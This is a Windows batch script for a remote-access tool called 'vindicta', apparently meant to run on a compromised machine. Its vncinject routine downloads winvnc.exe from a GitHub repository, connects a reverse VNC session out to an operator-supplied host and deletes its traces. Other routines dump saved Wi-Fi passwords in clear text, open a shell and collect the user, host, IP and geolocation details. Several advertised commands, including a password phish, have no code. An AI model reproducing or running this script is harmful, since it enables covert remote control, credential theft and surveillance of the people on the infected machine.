@echo off
chcp 65001 >nul
FOR /F "tokens=4 delims= " %%a in ('route print ^| find " 0.0.0.0"') do set localip=%%a
echo.
:input
cd %homepath%
set input=" "
set /p input="vindicta > "

if /I "%input%" EQU "help" (
echo.
echo   Information            Description        
echo    ---------            -------------       
echo   getinfo         Displays System Info      
echo   geolocate       Displays Geolocation Info 
echo   users           Displays System Users     
echo.
echo     Password             Description        
echo    ----------           -------------       
echo   wifipass        Displays Wifi Passwords   
echo   winphish        Windows Password Phish    
echo.
echo     Control              Description        
echo    ---------            -------------       
echo   shell           Remote Shell              
echo   vncinject       Injects Reverse Vnc       
echo   msg             Sends MessageBox          
echo   shutdown        System Shutdown           
echo.
goto input
)

if /I "%input%" EQU "vncinject" (
goto vncinject
)

if /I "%input%" EQU "msg" (
goto msg
)

if /I "%input%" EQU "exit" (
exit
)

if /I "%input%" EQU "getinfo" (
goto getinfo
)

if /I "%input%" EQU "shell" (
call cmd.exe
goto input
)

if /I "%input%" EQU "geolocate" (
goto geolocate
)

if /I "%input%" EQU "wifipass" (
goto wifipass
)

) else (
echo Invalid Command.
echo.
goto input
)

goto input

:vncinject
chcp 437 >nul
set /p vncip=Vnc Server IP: 
set /p vncport=Vnc Port: 
if not exist C:\ProgramData mkdir C:\ProgramData >nul
powershell (New-Object Net.WebClient).DownloadFile('https://github.com/syskey-del/svchost/raw/main/winvnc.exe','C:\ProgramData\winvnc.exe')
powershell (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/syskey-del/svchost/main/UltraVNC.ini','C:\ProgramData\UltraVNC.ini')
:vncwait
ping localhost -n 3 >nul
if not exist C:\ProgramData\winvnc.exe goto vncwait
if not exist C:\ProgramData\UltraVNC.ini goto vncwait
powershell -command C:\ProgramData\winvnc.exe -run
powershell -command C:\ProgramData\winvnc.exe -connect %vncip%::%vncport%
set /p null=Press any Key to Continue...
taskkill /im winvnc.exe /f
ping localhost -n 2 >nul
del C:\ProgramData\winvnc.exe
del C:\ProgramData\UltraVNC.ini
echo.
chcp 65001 >nul
goto input

:wifipass
echo.
for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
    set wifi_pwd=
    for /F "tokens=2 delims=: usebackq" %%F IN (`netsh wlan show profile %%a key^=clear ^| find "Key Content"`) do (
        echo %%a: %%F
    )
)
echo.
goto input

goto input

:geolocate
setlocal enabledelayedexpansion
curl -s ifconfig.me/ip>>%appdata%\Debug.txt
set /p ip=<%appdata%\Debug.txt
curl -s http://ipinfo.io/%ip%/json>>%appdata%\Publish.txt

for /f "tokens=* delims= " %%X in (%appdata%\Publish.txt) DO (
    set line=%%X
    set line=!line:"=!
    echo  !line!>>%appdata%\Release.txt
)
endlocal

echo.
echo   Geolocation
echo  -------------
type %appdata%\Release.txt | findstr /v "{" | findstr /v "}" | findstr /v "readme"
echo.
del %appdata%\Release.txt
del %appdata%\Publish.txt
del %appdata%\Debug.txt
goto input

goto input

:getinfo
curl -s ifconfig.me/ip>>%appdata%\Debug.txt
:infowait
ping localhost -n 1 >nul
if not exist %appdata%\Debug.txt goto infowait
set /p publicip=<%appdata%\Debug.txt
del %appdata%\Debug.txt
FOR /F "tokens=2 delims=:" %%a in ('systeminfo ^| find "Registered Owner"') do set owner=%%~a
FOR /F "tokens=2 delims=:" %%a in ('systeminfo ^| find "OS Name"') do set osname=%%~a
FOR /F "tokens=2 delims=:" %%a in ('systeminfo ^| find "System Manufacturer"') do set manufacture=%%~a
set owner=%owner: =%
set osname=%osname:~19%
set manufacture=%manufacture:~7%
echo.
echo Username: %username%
echo Hostname: %computername%
echo OS: %osname%
echo Owner: %owner%
echo Local IP: %localip%
echo Public IP: %publicip%
echo Manufacturer: %manufacture%
echo.
goto input

goto input
